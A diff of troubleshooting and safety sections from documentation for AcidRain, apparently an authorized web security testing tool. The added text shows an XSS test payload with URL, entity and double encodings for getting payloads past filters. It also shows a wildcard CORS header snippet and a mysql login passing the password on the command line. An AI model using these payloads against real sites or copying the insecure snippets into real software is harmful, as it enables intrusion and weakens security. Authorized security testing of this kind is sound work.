+module.exports = { runTestSuite };
 ```
 
 ## Troubleshooting
 
-### Common Issues
+### Issue: Scripts Not Executing
 
-**Issue: Scripts not executing in browser**
+**Solution:** Check authorization environment variable:
 
-Check Content Security Policy (CSP) headers. AcidRain scripts may be blocked:
-
-```javascript
-// Check CSP
-console.log(document.querySelector('meta[http-equiv="Content-Security-Policy"]'));
-
-// Alternative: Use browser console
-fetch(location.href)
-    .then(r => r.headers.get('content-security-policy'))
-    .then(csp => console.log('CSP:', csp));
+```bash
+export ACIDRAIN_AUTHORIZED=true
 ```
 
-**Issue: PHP scripts timing out**
+### Issue: PHP Connection Errors
 
-Adjust timeout settings in configuration:
+**Solution:** Verify database credentials and connectivity:
+
+```bash
+# Test MySQL connection
+mysql -h $ACIDRAIN_DB_HOST -u $ACIDRAIN_DB_USER -p$ACIDRAIN_DB_PASS $ACIDRAIN_DB_NAME
+
+# Check PHP extensions
+php -m | grep -i pdo
+```
+
+### Issue: CORS Errors in Browser
+
+**Solution:** Configure test server with proper headers:
 
 ```php
 <?php
-// Increase execution time for testing
-set_time_limit(300); // 5 minutes
-ini_set('max_execution_time', 300);
-
-// Use in scripts/php/
+// Add to PHP scripts
+header('Access-Control-Allow-Origin: *');
+header('Access-Control-Allow-Methods: GET, POST');
+header('Access-Control-Allow-Headers: Content-Type');
 ?>
 ```
 
-**Issue: Payloads not reflecting**
+### Issue: Payloads Not Triggering
 
-Check encoding and context:
-
-```javascript
-// Debug payload reflection
-function debugReflection(payload) {
-    console.log('Original:', payload);
-    console.log('HTML encoded:', payload.replace(/</g, '&lt;').replace(/>/g, '&gt;'));
-    console.log('URL encoded:', encodeURIComponent(payload));
-    console.log('Found in page:', document.body.innerHTML.includes(payload));
-}
-```
-
-**Issue: Permission denied errors**
-
-Ensure proper authorization and file permissions:
-
-```bash
-# Fix log directory permissions
-mkdir -p ./logs
-chmod 755 ./logs
-
-# Set environment variables
-export ACIDRAIN_ENV=testing
-export REQUIRE_AUTH=true
-export TARGET_BASE_URL=http://localhost:8080
-```
-
-**Issue: False positives in testing**
-
-Implement verification checks:
+**Solution:** Check encoding and context:
 
 ```javascript
-function verifyVulnerability(payload, context) {
-    // Check if payload actually executed vs just reflected
-    const reflected = document.body.innerHTML.includes(payload);
-    const executed = window.acidRainExecutionFlag === true;
-    
-    return {
-        reflected: reflected,
-        executed: executed,
-        vulnerability_confirmed: reflected && executed
-    };
-}
+// Test different encoding methods
+const payload = '<script>alert(1)</script>';
+console.log('Original:', payload);
+console.log('URL encoded:', encodeURIComponent(payload));
+console.log('HTML entities:', payload.replace(/</g, '&lt;').replace(/>/g, '&gt;'));
+console.log('Double encoded:', encodeURIComponent(encodeURIComponent(payload)));
 ```
 
 ## Best Practices
 
-1. **Always get authorization** before testing any system
-2. **Use isolated environments** for learning and development
-3. **Log all testing activity** for audit purposes
-4. **Respect rate limits** and implement delays between requests
-5. **Validate environment variables** before running tests
-6. **Keep payloads updated** with latest security research
-7. **Review results manually** - automated tools can have false positives
-8. **Document findings** thoroughly for remediation teams
+1. **Always obtain authorization** before testing any system
+2. **Use isolated environments** (VMs, containers, local servers)
+3. **Document all tests** with timestamps and results
+4. **Never test production systems** without explicit permission
+5. **Store credentials** in environment variables, never in code
+6. **Log all activities** for audit trails
+7. **Clean up test data** after completion
 
-## Environment Setup Example
+## Safety Reminders
 
-```bash
-# .env file for AcidRain testing
-ACIDRAIN_ENV=testing
-TARGET_BASE_URL=http://localhost:8080
-ALLOWED_HOSTS=localhost,127.0.0.1
-REQUEST_TIMEOUT=5000
-ACIDRAIN_LOGGING=true
-ACIDRAIN_LOG_PATH=./logs/
-LOG_LEVEL=info
-MAX_PAYLOADS=50
-REQUEST_DELAY=1000
-USER_AGENT=AcidRain-SecurityTester/2026
-REQUIRE_AUTH=true
-CONFIRM_TESTS=true
-DRY_RUN=false
+⚠️ **IMPORTANT**: AcidRain is for authorized security testing only. Unauthorized use against systems you don't own or have permission to test is illegal and unethical.
 
-# Database for testing (if needed)
-DB_HOST=localhost
-DB_NAME=test_db
-DB_USER=test_user
-DB_PASS=test_password
-```
-
-Load environment variables in your scripts:
-
-```javascript
-// Node.js
-require('dotenv').config();
-const config = require('./configs/acidrain-config.js');
-```
-
-```php
-<?php
-// PHP
-// Use vlucas/phpdotenv or similar
-$dotenv = Dotenv\Dotenv::createImmutable(__DIR__);
-$dotenv->load();
-?>
-```
-
-## Legal and Ethical Notice
-
-AcidRain is intended for authorized security testing only. Always:
-
-- Obtain written permission before testing
-- Test only systems you own or have explicit authorization to test
-- Use responsibly in educational and research contexts
-- Comply with local laws and regulations
-- Report vulnerabilities responsibly through proper channels
-
-Unauthorized access to computer systems is illegal. Use AcidRain ethically and legally.
-```
+- Only test systems you own or have written authorization to test
+- Use isolated lab environments whenever possible
+- Follow responsible disclosure practices
+- Comply with all applicable laws and regulations
+- Respect scope limitations in security engagements
